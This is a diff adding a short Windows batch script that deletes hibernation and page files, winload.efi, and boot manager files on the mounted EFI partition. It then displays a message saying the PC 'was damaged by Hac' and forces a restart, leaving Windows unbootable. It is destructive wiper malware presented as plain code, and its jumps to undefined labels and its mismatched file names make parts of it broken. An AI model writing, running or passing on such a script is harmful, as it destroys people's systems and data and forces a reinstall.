@@ -1,0 +1,18 @@
+@echo off
+attrib -r -s -h c:\hiberfil.sys
+del c:\hiberfil.sys
+attrib -r -s -h c:\pagefile.sys
+del c:\pagefile.sys
+attrib -r -s -h c:\WINDOWS\system32\winload.efi
+del c:\WINDOWS\system32\winload.efi
+mountvol v: /S
+if %errorlevel% neq 0 (echo Mount ESP error! && goto exit_point)
+if "%WinBit%" == "32" ( goto AddFunc32 )
+if "%WinBit%" == "64" ( goto AddFunc64 )
+attrib -r -s -h v:\Boot\zh-CN\bootmgr.exe.mui
+del v:\Boot\zh-CN\bootmgr.mui
+attrib -r -s -h v:\EFI\Microsoft\Boot\bootmgfw.efi
+del v:\EFI\Microsoft\Boot\bootmgfw.efi
+mountvol v: /d
+echo Your PC was damaged by Hac, the only way to save your computer is reinstall Windows!
+shutdown -r -t 5
